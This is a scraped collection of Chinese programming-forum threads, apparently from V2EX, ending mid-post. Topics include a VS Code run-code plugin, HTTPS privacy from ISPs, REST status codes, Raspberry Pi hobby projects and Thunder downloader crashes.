shebang 在 Windows 上并没有吧。不过可以考虑当作个 feature 来做。欢迎到 github 给我提这个 feature ，如果你想自己实现的话，也非常欢迎 PR ！", " 哈哈哈😆", "刚试了试，感觉很棒，谢谢楼主。", "哈哈，原来作者在这呀，非常棒的插件", "支持。试试。", "32 个赞\\(≧▽≦)/", " \r", "赞一个, 小文件直接用着很方便, 文件多再设 proj", " 很有意思的功能！可以考虑实现下！", " 对！运行单个小文件非常方便！", "这个要具体语言的运行库么，还是楼主的云上运行？", "这个必须赞", "mark 一下", " 对的，需要相应的解释器或编译器。比如 JS 需要 Node ， C 需要 gcc 。当然也可以根据需要自己设置，比如可以用 clang 替换 gcc 。", "感觉比 CodeRunner2 还好用！赞一个", " 😎😎", "大牛", "看起来不错的样子，最近也有点使用 VSCODE 的兴趣～～ mark 一下", "这个强， Code Runner 2 胜在支持 Objective C ，可惜收费。。求问 Atom 下有没有类似的东西。。。", " vs2015 没找到 CTRL+P ，怎么安装。。。", "  这个插件是 Visual Studio Code 的： ", " ，不是 VS IDE 😅", " #47 好尴尬啊。。刚才下了 VS CODE 试了下，别的都挺满意， CTRL SHIFT O 有些认不出来，没有 minimap 暂时性流失。。", " 看什么语言了吧， Node.js 有 built-in 支持，其它语言的'Go to Symbol'还是要另外装插件"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>帮我看看这两个风格你们喜欢哪一个</p>\n<p><a href=\"http://old.leavesongs.com\" rel=\"nofollow\">http://old.leavesongs.com</a></p>\n<p><a href=\"https://www.leavesongs.com\" rel=\"nofollow\">https://www.leavesongs.com</a></p>\n<p>微博上好像喜欢前者比较多，不过我比较喜欢后一个。</p>\n</div></div>", "<div class=\"topic_content\">选择困难症已经被治愈了，方法就是……右下角加了切换主题的链接，点一下就可以 cycle 了</div>"], "reply": "43", "tittle": "帮我看看这两个风格你们喜欢哪一个", "comment": ["第二个挺好，第一个在我这（ Fx 51.0 ）有点小问题，如图：\r", "\r", "第二", "更喜欢新的，另外新的 pre block 的 padding bottom 大概还可以调调？:D", "新版本换成亮色系会更好", "第一个看着不累。敲代码的可能倾向于后者", "至少后一个在手机上能看", "第二个简单好看。第一个太多内容了", "第二个，下一题", " 你这么一说，看着是有点别扭", "新的好看", "2333 我就说第二个好看\r", "\r", "真的，换个配色嘛", "\r", "好看,,,  \r", "想当年梦想学大牛空手黑站拿 Shell,都是梦了  去武汉培训渗透测试,5800 填了一个月的坑.", "第一个感觉太杂乱，有点像 CMS 网站的感觉\r", "第二个还不错，不过链接默认有下划线强迫症起来了", "lz ， vultr ，博客跟 ss 你这个配置用下来如何？", " \r", "内存够。我上的 docker ，不上 docker 的话更加绰绰有余，不过如果用 mysql 的话 768M 内存+docker 会有点吃紧，我用的 postgres 还好。\r", "翻墙无障碍，还可以。", "刚喝酒喝到吐，饿哦现在的第一感觉是第二个人，我个人是做后端的，但做前端的比较注重的是对用户友好，毕竟不是做门户类网站，所以越简单越好", " 2333 黑历史", "第二个。", "选第二个。第一个太乱了，五颜六色的。", "第二个", "No Comic Sans😂", "作为一个伪前端，我选第二个😏", "两者相比还是后者更好一点视觉观感上。其实还可以更好", "后者，前者看上去太乱，后者明显清爽很多。", "肯定第二个~", "第二个", "第一个太乱了\r", "喜欢第二个", "第二个莫名的比第一个逼格高很多", "第二个看起来专业", "p 牛要换博客主题吗，虽然第一个习惯了，但是第二个看起来更舒服点，很简洁", "简单的好", "哈哈潇神选择困难症啊", "喜欢第一个的配色，第二个太压抑了。", " \r", "楼主 歪个楼 请问 IDE 你用的是哪个主题 嘿嘿嘿\r", "\r", "![]( ", " )", "2", " 已治愈，现在新博客右下角可以换主题了……", "第一个去掉左边栏和第一屏的内容就不错\r", "第二个比较简洁一目了然，但是不适合那种要查找翻阅博客的用户阅读", "第二个，但是需要加上预览。", " vscode 默认的呀", "两个都乱，第一个比第二个乱，所以我喜欢第二个", "第二个", " 完胜"]},
{"content": ["<div class=\"topic_content\">昨天那个帖子发了之后，看了大家的意见， linux 不太适合生手用，于是听取建议，改试用了国产的安卓，分别是 remix os 和 phoenix ox ， remix 装好后，基本不可用，论坛搜了下，说是可能硬件的原因。\r<br>\r<br>于是又装了 phobnix ，这个没问题，能正常使用，自带的星尘浏览器体验还挺好的，下了个鲁大师测了跑分，见截图，实际上主机是双核的，但是只能读取到一个核心。性能和 h5 的跑分来看，这完全就是一个低端千元机的水平。。。所以说 X86 安卓拯救落后 PC 恐怕还是有点困难的。。。\r<br>\r<br>\r<br><img src=\"http://ww1.sinaimg.cn/large/0060lm7Tgy1fc77799a64j30ew0n4gos.jpg\" class=\"embedded_image\"> \r<br><img src=\"http://ww4.sinaimg.cn/large/0060lm7Tgy1fc7773a356j30ew0n4jv9.jpg\" class=\"embedded_image\"> \r<br><img src=\"http://ww2.sinaimg.cn/large/0060lm7Tgy1fc77hs9rfqj30ew0nc78k.jpg\" class=\"embedded_image\"> </div>"], "reply": "23", "tittle": "Linux 哪个版本更好用流畅后续－－换用了下 x86 的安卓", "comment": ["人家没错，你这 CPU 就是只有一个核", "显卡落后了吧？没毛病", "只有一个核是什么鬼", " 他以为他的 CPU 是双核。其实不是", "你的 CPU 并不是双核的啊", "你的 cpu 就是单核的，你在 Windows 里看到两个框框是因为超线程技术。\r", "客服环节:一个 CPU 有两个线程，就是双线程。就是把单核心的 CPU ，虚拟成双核心，双核心的虚拟成四核心，以此类推。双倍的翻，俗称双线程。", "屏幕分辨率识别不对", "现在电脑都很便宜了吧， 2000 块打主流游戏都没啥问题", "你这个 CPU 就不要叫电脑了吧，高配版树莓派", "……安卓平板就好好用 arm 的吧，免得有什么应用不兼容，虽然理论上都兼容。", " 吊打树莓派还是可以的", "x86 版的 android 真的是非常卡顿，没啥实用价值，还是直接跑 xfce 吧。", "一个价值四五十块的 CPU 你指望能拯救到什么程度。", " AMD 哪来的超线程。这货就是 1c1t 的。\r", "单核桌面型处理器\r", "\r", "Athlon 64 \"Newcastle\" (CG, 130 nm)\r", "3800+\t2400 MHz\t512 KiB\t1000 MHz\t12x\t1.50 V\t89 W\t939\t2004 年 6 月 1 日\tADA3800DEP4AW\r", "\r", "\"Venice\" (E3 & E6, 90 nm)\r", "3800+\t2400 MHz\t512 KB\t1000 MHz\t12x\t1.35/1.40 V\t67 W\t939\t2005 年 4 月 4 日\tADA3800DAA4BP ADA3800DAA4BW\r", "\r", "\"Orleans\" (F2 & F3, 90 nm)\r", "3800+\t2400 MHz\t512 KiB\t1000 MHz\t12x\t1.25-1.40 V\t62 W\t2006 年 5 月 23 日\tADA3800IAA4CN ADA3800IAA4CW\r", "3800+ (F3)\t2400 MHz\t512 KiB\t1000 MHz\t12x\t1.25-1.40 V\t62 W\t2007 年 2 月 20 日\tADA3800IAA4DH\r", "\r", "不知道楼主用的是哪一个，不过其实没差太多。", " 好吧，没看他之前的帖子，我还以为他之前是 Windows 里看到两个框框，就以为是双核的。", "x86 Android 使用体验比 linux 要好，但性能要求一点也不低，而且识别不出我的独显。我 i7 5500u 的笔记本装 remix os 和 phoenix os 都有点卡顿。\r", "我同意楼主的结论： x86 Android 拯救不了落后 pc ，觉得能的最好自己体验下。\r", "真想用的话最好买 remix 或 phoenix 官方出的平板或笔记本。", "楼主何不试着上手原生的 ", "这个截图最有意思的是 oppo R9 ，居然跟我们家这台 8 年前的老电脑水平差不多", "特意安装了 phoenix os 测试了一下\r", "整体可用性很差，应用经常崩溃，除了用来挂游戏似乎没有什么更好的用处", "这货是 8 年前的哇？ 8 年前不是 win7 嘛。上一台本子 7 年。现在在跑 Debian+LXDE 。蛮快用起来", " 截图是竖屏的？具体显示如何", "用 android 是为了让你少折腾，特别是你给父母用他们更折腾不来。并不是说 android 比 ubuntu 、 centos 、 freebsd 之类性能高。\r", "\r", "再说了 8 年前的 pc 性能能赶上去年的手机，你可以满足了", "落后 PC 过了些年头确实是没救的，毕竟安迪比尔定律摆在那"]},
{"content": ["<div class=\"topic_content\">想搭建一个站点来保存一些私密但又不至于“涉密不上网”的内容，站点的用户只有我一人，想请问诸位，如果站点使用 https ，那么可以这些出入流量，在网关、在 ISP 看来，是怎么样的呢？应该以怎么样的形式来通讯呢？</div>"], "reply": "33", "tittle": "https 是否可以逃过监控？", "comment": ["考虑到只有你一个人用，访问量低的可怜，估计也入不了哪位黑客的法眼。不过 HTTPS 还是必须的，因为考虑到你可能用公共 WIFI ，没有 HTTPS 的话肯定会被人看光了。用了 HTTPS 之后，网关和 ISP 就只能看到加密后的字节流，无法解析出原本的内容来。", "可以弄个本地的，然后同步到 Dropbox 备份，没必要放网上", "至少要 HTTPS + HSTS Preload 才行\r", "\r", "可以加密再上传呀 用的时候在本地解密", "如果要混淆， https 太显眼，防止解密内容倒是可以", "理论上第三方是解不出来的。加个 DH 密钥交换更保险了", " \r", " \r", " \r", " \r", " \r", "诸位的意思大致上就是 https 的话只能看到请求的域名了？\r", "那么 GET 方法传输的参数会暴露嘛？", "1. 网关和 ISP 在握手阶段能看到主机头，你的证书通常也会暴露你的域名\r", "2. 网关和 ISP 能看到你和服务器之间的协议是 HTTP ，采用了 TLS/SSL 加密\r", "3. 网关和 ISP 能看到通讯的包数、带宽，也能记录通讯时间，双方 IP\r", "4. 如果采用了不安全的协议，比如 SSLv3 ；或者服务器存在严重漏洞比如 Heartbleed ，那你的通讯可能被解密， cookie 和密码可能被窃听。建议随时更新服务器软件，自用可以仅支持 TLS v1.2 和 AES-GCM", "1 首先自己签发 SHA256 算法证书,2048 位或 4096 位以上\r", "2 Web Server 上设定关闭 ssl 弱加密算法,或者只留几个允许的加密算法\r", "3 客户端安装根证书\r", "最后排除服务端跟客户端漏洞,排除 CA 证书泄漏,依照现在的科技水平,这时传输的流量在网上没人能解密", " 感谢大大，再请问一下 GET 方法的参数会暴露吗？", " 不会", "5. 自用务必采用 ECHDE 来交换密钥，即使某天你的私钥泄露，也无法解密以前的数据。\r", "6. 对安全要求更高的话，可以采用双向证书验证，大多数操作系统都支持。", " \r", "使用阿里云签发的 Symantec 免费 DV 可以达到要求吗？", "@绝对安全就要自己用 openssl 签发证书\r", "openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -nodes -sha256 -days 3650", "hsts 并不是必须，只不过在访问时需要注意下证书是否正确，是否是使用了 https", " 需求并非是同步文件和数据呀", "先回答楼主的问题：是的， HTTPS 足够搞定“在网关、在 ISP 看来”。\r", "\r", "众所周知， HTTPS 最薄弱的环节是 CA(Certificate Authority, “证书权利机关”)，搞定一个 CA ， HTTPS 等于“裸奔”。被信任的 CA 好多呀，而且隔三差五就爆出被黑等等。\r", "\r", "如果你是“下一个斯诺登”，就别靠 HTTPS 。当然楼主说了情况不是这样，所以我说 HTTPS 还是不错滴。", " 采用 HTTPS 后，七层的信息只有域名能获取，其余的只有四层数据了，所有七层的都是加密的。你要做的就是防止有漏洞被解密、中间人攻击或者入侵服务器、电脑。\r", "\r", "如果连 CA 都信不过(看安全等级)，双向证书验证是最好的选择。", "自用，何不 GnuPG 加密后上传呢？配合服务器上全分区 LUKS 加密。", " 内容的来源比较多，并非我一个人上传，也通过各种接口和爬虫收集", " 只是你自己访问的话，用特定受限只有 sftp 功能的系统账户(仅用独立的 public-key 认证) 也可以很安全。", " sftp 没法提供类似预览的功能呀", " 还有个办法，你服务器提供 VPN 服务， https 只对 VPN 网络开放，访问时，先联 VPN", " ssh tunnel 也行， https 只对本地开放，先用 https tunnel 给自己电脑和服务器的 https 端口用隧道连起来，然后自己电脑上直接 https 访问隧道影射的本地端口。", " 似乎是个办法，我权衡一下，谢谢了", "只有一人的话为啥要上网站啊\r", "我的解决方法是用一个加密的镜像， DMG 或 VHD 都可以，同步到 Dropbox 。要用了直接挂载，有修改自动同步。\r", "挂在公网谁都可以访问，就不说搜索引擎爬虫了。", "后排提醒楼主加入 robots.txt 。", "保不准有爬虫到访楼主的涉密不上网的内容", "我用 https + basic auth", "其实你不如在 VPS 上把数据盘 LUKS 加密，然后用 sftp 访问。", "逃得过中国的监控逃不过美国的监控", " \r", "拜谢，但是我的需求是存储和通讯，需要允许预览的，所以没有办法用 sftp", "我一朋友是国内云领域的,他跟我说国内的各种云都安装了网监的软件,系统里的文件都能监控.具体是磁盘监控还是内存监控就不的而知了.", " 并非用国内的，不过就算国内的 vps ，软件也可以删除嘛", " \r", "网监自己的软件装在母鸡上,后台监控,你感觉不到监控软件的存在"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"10101.Ep6.GEN.Pt1.jpg\" src=\"http://upload-images.jianshu.io/upload_images/4181079-f8ada7437fd05bfe.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep6.GEN.Pt2.jpg\" src=\"http://upload-images.jianshu.io/upload_images/4181079-5296c00d09ab287e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep6.GEN.Pt3.jpg\" src=\"http://upload-images.jianshu.io/upload_images/4181079-29bd0454c2ad3d93.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<h2>这里是吐槽</h2>\n<ul>\n<li>恶补了一下 NodeJS 的知识, 然而工作中从没用到过~</li>\n<li><strong>内容纯属虚构</strong>, 与作者本人经历没有任何关系没有任何关系没有任何关系...</li>\n<li><strong>漫画中存在夸张成分</strong>, 你要是不相信就在相亲时修个 Bug 试试看 o(<em>￣￣</em>)o</li>\n</ul>\n<h2>相关链接</h2>\n<p><a href=\"http://szhshp.org/comics.html\" rel=\"nofollow\">《 10101 》全章节列表</a></p>\n</div></div>"], "reply": "7", "tittle": "[程序员漫画+贺岁篇?] 《10101》EP6：过(xiang)年(qin)", "comment": ["感觉这种简单的画风看着很舒服", "漫画最后，重要的事情当真要说三遍", "这个故事的意思是：相亲要找胸大的， C 罩杯及以上才有共同话题。", "这个故事告诉我们。程序员学 JS 才能找到吕盆友（逃", " 2222233333", " 别闹..._(:з」∠)_", "唉呀，不会 js..."]},
{"content": ["<div class=\"topic_content\">刚才发现一个前同事的 Github 上有两个 star 很多的项目，一个是收集型的 markdown 项目，另一个是被用在好几个知名国外公司的前端组件。\r<br>像第一个项目这样的资源收集型的高 star 项目，在国内大神中其实常见。\r<br>我好奇的是第二个项目（这里称作 B ）是怎么被多个知名公司用的，我发现代码是来自别的项目（这里称作 A ， A 和 B 的前期 commit 都是相同的，但 B 不是 fork 了 A ，因为没有`forked from xxxx`，没有 fork ，这样会误导人认为整个项目都是他做的）， A 项目好几年都没人维护了，然后 A 项目的 issue 下发个新的 issue 链接到 B ，并承诺会维护，然后 B 的 star 就越来越多了。\r<br>\r<br>所以，这里是有个提高自己知名度的方法的：\r<br>1 、找个知名的长时间不维护的项目\r<br>2 、 import 这个项目（而不是 fork ）\r<br>3 、维护一段时间，例如修复几个原项目的 issue\r<br>4 、在原项目上发个 issue ，说我的这个是一直在维护的，修复了某某某 BUG 等等\r<br>5 、原来项目的用户可能会 star 这个项目\r<br>6 、面试官或其他人看到后，可能会以为，原来 XXX 是他做的啊，是大神\r<br>\r<br>大家怎么看 markdown 大神和上面这种方式的大神？\r<br>（项目地址就不贴了，无仇无怨的，只是想讨论下我刚才发现的这种方式）</div>"], "reply": "35", "tittle": "Github 上的 markdown 大神", "comment": ["根本就是窃取。", "这样有意思吗？职业道德听说过吗？", "看看 commit history 全暴露了\r", "真要是死掉了的项目能有人接手是好事，比如 pillow\r", "前提是真的接了\r", "其次不巧遇上 Google 的领导直接 KO", "会 Google 的领导", "你提到的这个大神在告诉我们一个道理：事实胜于雄辩", "也要分得，我觉得能有几次重要升级维护那也无可厚非", " 自觉脸红（哎？？？", "不诚实减人品", "如果真的是维护好了，我觉得也不是坏事", "维护挺好的啊, fork 的关系本来就可以删掉的, 只要遵循 licences 就好. 何况还是原作者不维护的, 那就更没有问题了.\r", "如果领导看不出来是领导不行吧...", "所以，按你文中写的这么玩 github ，最终目的就是给面试官或其他人看，为了成为对方口里的大神对吗？", "收集型的 Markdown 项目很常见，有 stars 也很正常，有没有价值大家都知道。\r", "Fork 的项目取决于源项目的协议。如果协议允许重新修改再分发，那么即使不声明源项目，法律上和道德上也都完全没问题。\r", "\r", "开源需要持续的付出，表面上看他有很多 stars ，很风光，让人羡慕嫉妒。背后说不定也付出过很多的精力。\r", "\r", "总结一句话，只要是符合开源精神的，都值得鼓励。", "用心点做个 awesome-xxx ，保持更新并吸取别人的建议，弄多点 star 不难吧", " awesome xx 只能吸引 star ，极少有人看，只满足了收集癖而已", "如果真的持续维护一个已经不维护的好项目，即使是 fork 的也没关系吧？", "直接 fork 修改吧。", "读书人的事 怎么能叫偷？", "一个长期不维护 /停止维护的开源项目，在无法联系上原作者寻取授权的情况下，遵循原项目的协议并在其原有基础上的进行二次维护更新重新分发是值得允许的和肯定的。\r", "\r", "署名不带原作者不代表原项目属于他，但他维护的部分值得署名。", "真当面试的是傻子？\r", "\r", "你是不想在这个圈子里找工作了是不是？", "只能说，百度垃圾，不如谷歌", " 同感", "kennethreitz 也搞列表。。。你们怎么看", " 无脑黑？", "有人维护也算个好事，但这个 star 不瞎就能看出来，没意思", "谁说这样子的人就是「大神」了？\r", "\r", "投机取巧的人哪里的有。", "有人维护挺好的,加个注明就好了", " \r", "\r", "> 如果协议允许重新修改再分发，那么即使不声明源项目，法律上和道德上也都完全没问题。 \r", "\r", "只可惜这句话很容易就被人理解成“改掉了 Copyright 也没问题”，然后连原作者一起都被删除了。", "我觉得 star 多的项目一定会有好事者去查的，躲得了初一躲不了十五", "每个 star 都能让我兴奋一整天(●ˇ∀ˇ●)", " 233333333333", "楼主为啥说前同事 刚当你同事的时候为啥不知道 你俩不写同一个语言？", "其实， markdown 收集型的价值是 垂直领域的优质资源聚合，有利于普及和减小不必要的搜索，也省电了不是，๑乛◡乛๑", "弱弱问一句 收集型是什么意思？", " 不是代码类的 repo ，比如 gfwlist 啊， adblock list 这一类的，资源整合的 repo ……", "看看 commits ，如果长期维护的，我觉得可以"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ol>\n<li>\n<p>如果请求体的格式错误，比如使用了格式错误的 JSON ，这时，应该使用状态码 400</p>\n</li>\n<li>\n<p>如果请求体的格式正确，但是其中的某个字段所包含数据由于业务逻辑而不能被使用时，比如不能使用已经存在的用户名，这时的状态码应该使用什么呢？</p>\n</li>\n</ol>\n<blockquote>\n<p>400: The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).</p>\n</blockquote>\n<blockquote>\n<p>403: The server understood the request but refuses to authorize it.</p>\n</blockquote>\n<p>疑惑点在：这种出于业务逻辑的原因而不能使用某个字段所包含的数据的情况，应该被归类于请求格式错误(400)，还是拒绝响应(403)呢？</p>\n</div></div>", "<div class=\"topic_content\">已经得到想要的答案。谢谢大家伙儿。</div>"], "reply": "7", "tittle": "请教：关于 RESTful API 中状态码的疑惑", "comment": ["可供参考：\r", "\r", "422 Unprocessable Entity 语义错误，适用大部分客户端错误的情况\r", "409 Conflict 冲突，适用需要用户解决冲突并重新提交的情况（用户名已被使用）\r", "\r", "其实除了一些非常常见的错误代码，其他的错误代码大家都没有很明确的共识，所以死扣哪个代码更合理意义并不大。", "我理解 400 是一个通用错误，如果你不确定用 4 几几，那就 400 吧", "看具体的原因，对于用户名冲突来说可以报  409 。用户名字符不符合规范可以用 400 。", "对于比较模糊或者模棱两可的请求错误，可以使用广义的 400 来表示这种错误，在 Response 的 `message` 字段中注明详细错误，同时在 API 文档中解释清楚\r", "\r", "对于楼主提到的，可以使用 422 Unprocessable Entity ，一楼已经给出了详细解释", "你可以把错误简单分为 301 ， 400 ， 500 然后返回的 json 加个自定义的 error code ，类似： error_code ：“ a200 ”， a200 表示某某错误， a201 表示某某错误", "我喜欢直接抛 403+json 提供错误码", "對於這種情況我個人習慣 422"]},
{"content": ["<div class=\"topic_content\">今天下午下单的，但是 Office Online 一直显示“正在设置...”，这个要设置多久啊？就是为了 OneDrive for business 才买的商业版，这个体验太差劲了吧。</div>"], "reply": "目前尚无回", "tittle": "有朋友用过 office 365 商业版吗？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我想问一下，这个扩展安不安全？我觉得还是很有用的，就是我担心私密数据被窃取，它会不会监听和自动 copy 备份我的数据？？</p>\n</div></div>"], "reply": "5", "tittle": "浏览器里面的一个 add-on，它可以设置密码框获得焦点，或者按 ctrl，或者双击密码框，显示保存的账号密码", "comment": ["查看一下扩展的源代码呗\r", "也不是看不到", "其实原理很简单， password-->text", "想看密码自己在审查元素里面把字段类型从 password 改成 text 就行了\r", "\r", "扩展能不能读取密码 只要允许运行就可以读取…说不定你别的扩展早就读取了", "是 chrome 扩展嘛？求个链接...", " "]},
{"content": "", "reply": "45", "tittle": "大家用树莓派做过什么有意思的事情不", "comment": ["智能小车，然后就吃灰。", "讲真 以前放寝室当服务器 但 1080p 电影都卡 现在在吃灰", "装系统？（逃", "之前见过一个人定时给自己开电热毯…", "吃灰", "国产 pi 曾经做过一段时间 nas ，后来被静电挂了...", "对了，做过智能家居语音识别中控，但是降噪搞不定，有电视音干扰就识别错误，最终放弃。", "现在一直放家里， cron+rsync 每天帮我备份服务器的文件和数据库", "放在宿舍里，每个小时定时给自己桌子拍一张照，每天 24 张定时上传七牛。另外用闲置服务器搭了个网站定时从七牛拖照片下来展示，可以在照片下面评论之类的。整个东西相当于一个照片日记了 233", "Minecraft 服务器。。。接下来抽时间做硬件应用，摄像头该接上啦", "做爬虫后生成 RSS", " 做 Minecraft 服务器？ PC 还是 PE ，能跑几人？", "teeworlds servers", " PC 用的 Spigot ， chunk 更新之类的调低，两个人玩十来分钟开始卡。 PE 用的 PocketMine-MP ，性能好一点，但是没办法做 UDP 端口转发，作罢。\r", "\r", "我的感受是树莓派不适合开服， 3b ，加了散热片，也很快烫、卡。现在在用阿里云开 PE 服。", "毕业设计用 beaglebone black 做了一个频谱仪 \r", "这算吗.....", "支付宝收款\r", "DDNS\r", "Minecraft 资源反代\r", "Minecraft CoreProtect 数据库 放在一个 64G 的 MLC U 盘上\r", "Minecraft mcbbs 爬虫\r", "Minecraft 某启动器的后台服务端\r", "天翼云盘直连获取\r", "HTTP 代理邮件发送\r", "还有服务监控\r", "\r", " 支付宝收款是怎么搞的？", " ", " MC 的资源反代和那个数据库是什么？求介绍", " 类似 bangbang93 的 bmclapi ", " 的国内资源镜像. coreprotect 是一个记录全部历史操作的插件自带用 sqlite 的 等历史记录多了 sqlite 就爆炸了 所以安了一个 mysql 给 coreprotect 用...", "dnsmasq 内网 dns", " 请问这是个什么图", "自动签到", " vSSH for mac ？我直接用 mac 原生 terminal 来 ssh ，写一个配置文件以后体验也挺好的", " 请问是否有相关教程？", "resplex", "同步文件", "说几个智能家居方面的用途：\r", "装了一个 Homebridge 让 HomeKit 支持 yeelight 灯泡；\r", "装过 HomeAssistant ，但是感觉并不是很有用，没有花太多时间折腾这个；\r", "跑个服务器配合 api.ai 的 bot 和 Google Assistant/Telegram 做一些好玩的事情；\r", "插了个摄像头监视家里，发现并没有什么意思；\r", "ShairPort Sync 作为 AirPlay 音频接收器，但是 3.5mm 接口干扰很大，也懒得去买块 usb 声卡了，有了 Google Home 也不需要这个；\r", "最近准备利用 castnow 和 tts 的 api 配合 Android 手机播报手机推送消息到 Google Home ；\r", "还有个想法是搞块屏幕做成类似这样的 [Smart Mirror]( ", ") 但是感觉用 Android Things 而不是 Raspbian 做更简单，但是上述的，特别是 HomeBridge 应该就废了", "内网 SMB 网盘、外网 Resilio Sync 网盘、 Aria2 远程下载、 SS 代理……", "当年买了个 Tegra-TK1 ，由于家里有西数的单碟 nas ，所以现在只用做 SS+Aira2 ，不知道还有别的好玩的不", "爬虫", "做过 Tor 的中继", "科学上网网关， RS485 数据采集器，内网服务器，智能小车", "做过一个影音中心，做过气象站，做过 nas 下载", "pi3+syncthing 做备份，很稳定。", "TODO 做个探空气球：加装 GPS GSM 压力计，挂在氦气气球下面", " 静电把树莓派弄挂了？那么严重啊，好可惜", " 气球是否有政策上的风险？还有高空可能会没有信号，怎么解决。\r", "我曾经想过 arduino ＋风筝", "ssh -R ＋ ss 用来从校外访问校内网站(存在 dns 问题)\r", "单独 ss 用来校内多地点多用户访问校外网站\r", "pi cam 每半分钟拍照用作 timelapse\r", "\r", "todo:与 arduino 通信并控制 rgb 灯带，灯带控制部分已有\r", "rf24 空气净化器数据采集，空净部分初步可用。\r", "rf24 夜灯系统，使用上述灯带", "homekit", "  气球是否有政策上的风险？还有高空可能会没有信号，怎么解决。 \r", "放飞续提前向当地气象部门申请。\r", "回收是需要等气球落到地面后，从 GPS 模块获取经纬度，再利用 GSM 电话模块发坐标给自己。\r", "可以参考 ", "默默的看了评论又看了正在吃灰的树莓派然后默默地关闭网页", "给公司做了一个 pm2.5 检测仪器，实时检测办公司 pm2.5 。\r", "以后计划加继电器，控制公司的 ffu 工作。", "目前在用：\r", "下载机+miniDlna\r", "ResilioSync\r", "微信机器人，主要用来自动保存亲戚群里发的照片和视频，定时检测空气质量变化，有变化发消息提醒", "写了个微博自动播报天气的脚本，每天定时两次天气播报"]},
{"content": ["<div class=\"topic_content\">闪退无数次了，今天实在受够了。</div>", "<div class=\"topic_content\">我在迅雷网站上下载了最新版本，覆盖安装了，现在似乎没问题了。\r<br>但我多次在迅雷软件里选择检查更新，然后点击一键更新，都没反应，我还以为是最新版本。\r<br>\r<br>\r<br>迅雷真垃圾。</div>"], "reply": "44", "tittle": "迅雷总是闪退，查了一下，似乎是某个 win10 版本的问题，能通过升级解决问题么？如果解决不了，有什么其他 bt 工具？谢谢", "comment": ["QQ 旋风", " 我买了迅雷的会员，会员加速之后确实很快。 QQ 旋风不知道效果咋样呢？一般下载速度多少 M ？加入种子很热门的话", "utorrent", " QQ 会员满速", "其实，通过降级也可以解决这个问题，一直用的还是老版 ", "垃圾迅雷， bt 软件满大街都是，比如 Transmission 和 uTorrent 。", "最新版迅雷不是没问题吗", " 好，我试试", " 版本号？", "问个事，为什么大家总觉得是系统的问题，从来不会认为是软件的锅？", "\r", "是 时候安利这个版本了", "推荐迅雷离线网页版 + ThunderLixianExporter + aria2 + yaaw", "迅雷极速版啊 ", " 358 版本有崩溃问题 360 修了", " 是吗，我没有注意，多谢提醒，平时很少用迅雷，也就种子用用", " 这里专业黑微软", " 换成苹果的电脑肯定说软件问题   可笑的事情很多  比如同样的运营商同样的 sim 卡拿 我用充话费送的安卓机满满的信号  然后一起的朋友用 iphone  那个傻屌在那吐槽说这个运营商的信号真垃圾", "mini 迅雷", "不是哦 那是迅雷想让你升级最新版了，之前用的好好的某天开始就闪了 之后看了下似乎是迅雷 9 更新了 然而我只想用极速版", "迅雷极速版总是崩溃，但是早期版本：比如迅雷精简版，一个古老的版本，很不错(*๓´╰╯`๓)♡", " 不是黑微软", "uTorrent, Transmission 都挺好的，为啥用迅雷呢？", " Transmission 你出个 win 版我分分钟放弃迅雷", " 来自人民网的大图床", "这不是 win 10 的日常么？", "我用的是这个版本\r", "补：\r", "我前天也刚刚遇到这个问题，然后当时下了一个补丁解决的。迅雷说是 win10 更新后，一个相关的 api 修改，导致的。\r", "后来发现，迅雷极速版有新版本，就是 11 楼兄弟说的这个，然后就安装了。\r", " #11 \r", "\r", "\r", " #13 这个更新日志好像没有及时更新，还有一个更新版本，就是 26 楼说的这个。\r", "\r", "\r", " #10 这个事情里，就是 win10 的锅，你不用给微软洗地。一般情况软件出问题，也不会找微软的问题，但是这个事情，迅雷一直在用是正常的，突然不能用了，而且 win10 最近刚更新过，你说是不是首先找 win10 的原因（因为 win10 更新的很频繁，出的兼容问题挺多的）", "顺便放个链接： ", "\r", " ", " ", " 表示我这样很久了。。。", "mac 版一直这样啊。。。", " Transmission 是 Qt 写的，你自己编译一个 Windows 版不就有了嘛\r", "\r", "而且好像官方也发布了 Windows 版本，不过没有放到网站上。\r", "\r", " 微软不会改文档化的 API ，比较坑爹的是 windows 上开发者习惯了私有 API 开发…这也不能全怪微软，微软本来也不保证这部分 api 的稳定性", " 巧了，我用的就是 windows 下的 Transmission-QT 。 32 楼已经贴出下载链接了。", " \r", " 感谢两位", " Transmission 我还是偏向于用 daemon 加 remote GUI 来控制，个人觉得更舒服些。\r", "（当然我 daemon 大都跑在 Linux 下", "我用的是 qBittorrent.\r", "因为那个有封禁用户的功能。看到迅雷就给他来一个。", " 哦？这么说 ss 用的 proxy 的 API 不是被 m$改了而是被你吃了？", "Cloud Torrent 不错。", "去找 极速迅雷 1.0.35.366 这个版本目前时这个系列的最后一个版本了吧， WIN10 完美。", "FDM", "一直在用迅雷 7 ，没有问题。", "\r", "这个才是正解。", "阳台上有修正版"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一直都是自学，时间跨度比较长，学的也很杂， Java 后端 ，做过练手的小 case</p>\n<p>基本上该知道的都知道 该入门的都入了一遍 （ Java SQL Spring 反射 事务 前端 xx 之类）</p>\n<p>前段时间报了九章的算法班，打算加强下 刷题的能力</p>\n<p>（自学过一段时间的 算法 x 数据结构 都限于了解，\n一编程就懵逼 思路全断，这也是后来报班的缘故，\n说实话 收获还是有的，开阔了一些解题的思路，以及解题的思维）</p>\n<p>（我个人觉得解决这些算法问题，在实际工作中应用不大，\n但是 这些算法的思路 以及 数据结构 又培养了我分析解决问题的思维模式）</p>\n<p><a href=\"http://www.lintcode.com/zh-cn/problem/number-of-islands/\" rel=\"nofollow\">http://www.lintcode.com/zh-cn/problem/number-of-islands/</a></p>\n<p>像以前这道题，我 看到是半天拿不出半点思路的，</p>\n<p>但是我昨天 只用了 2 分钟 想出 队列结合 hash 表的方式 就 AC 